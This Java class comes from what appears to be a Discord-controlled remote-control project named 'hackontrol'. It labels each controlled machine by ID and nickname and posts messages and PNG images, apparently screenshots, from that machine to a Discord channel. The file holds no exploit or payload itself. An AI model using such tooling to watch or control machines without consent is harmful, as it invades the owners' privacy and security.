package com.khopan.hackontrol.source;

import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.function.Consumer;
import java.util.function.Supplier;

import javax.imageio.ImageIO;

import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.utils.FileUpload;

public class DefaultCommandSource implements CommandSource {
	private final String machineIdentifier;
	private final MessageChannel channel;
	private final Supplier<Boolean> getSelected;
	private final Consumer<Boolean> setSelected;
	private final Supplier<String> getNickname;
	private final Consumer<String> setNickname;

	public DefaultCommandSource(String machineIdentifier, MessageChannel channel, Supplier<Boolean> getSelected, Consumer<Boolean> setSelected, Supplier<String> getNickname, Consumer<String> setNickname) {
		this.machineIdentifier = machineIdentifier;
		this.channel = channel;
		this.getSelected = getSelected;
		this.setSelected = setSelected;
		this.getNickname = getNickname;
		this.setNickname = setNickname;
	}

	@Override
	public String getMachineId() {
		return this.machineIdentifier;
	}

	@Override
	public String getName() {
		String nickname = this.getNickname.get();

		if(nickname != null) {
			return nickname + " (" + this.machineIdentifier + ')';
		}

		return this.machineIdentifier;
	}

	@Override
	public boolean isSelected() {
		return this.getSelected.get();
	}

	@Override
	public String getNickname() {
		return this.getNickname.get();
	}

	@Override
	public MessageChannel getChannel() {
		return this.channel;
	}

	@Override
	public void setSelected(boolean selected) {
		if(this.getSelected.get() == selected) {
			return;
		}

		this.setSelected.accept(selected);
		this.channel.sendMessage('`' + this.getName() + "` was " + (selected ? "" : "un") + "selected").queue();
	}

	@Override
	public void setNickname(String nickname) {
		this.setNickname.accept(nickname);
	}

	@Override
	public void sendMessage(String message) {
		this.channel.sendMessage(message).queue();
	}

	@Override
	public void sendCodeMessage(String message) {
		this.sendMessage('`' + message + '`');
	}

	@Override
	public void sendBoldCodeMessage(String message) {
		this.sendMessage("**`" + message + "`**");
	}

	@Override
	public void sendImage(Image image) {
		FileUpload upload = DefaultCommandSource.toFileUpload(image, this);

		if(upload == null) {
			return;
		}

		this.channel.sendFiles(upload).queue();
	}

	@Override
	public void sendImage(Image image, String message) {
		FileUpload upload = DefaultCommandSource.toFileUpload(image, this);

		if(upload == null) {
			return;
		}

		this.channel.sendMessage(message).addFiles(upload).queue();
	}

	public static FileUpload toFileUpload(Image image, CommandSource source) {
		BufferedImage bufferedImage;

		if(image instanceof BufferedImage buffered) {
			bufferedImage = buffered;
		} else {
			int width = image.getWidth(null);
			int height = image.getHeight(null);
			bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
			Graphics2D Graphics = bufferedImage.createGraphics();
			Graphics.drawImage(image, 0, 0, null);
			Graphics.dispose();
		}

		ByteArrayOutputStream stream = new ByteArrayOutputStream();

		try {
			ImageIO.write(bufferedImage, "png", stream);
		} catch(Throwable ignored) {
			source.sendMessage("Failed to send an image `" + source.getMachineId() + '`');
			return null;
		}

		return FileUpload.fromData(stream.toByteArray(), "image.png");
	}

	@Override
	public void message(String message) {
		this.channel.sendMessage('`' + this.getName() + "`: " + message).queue();
	}
}
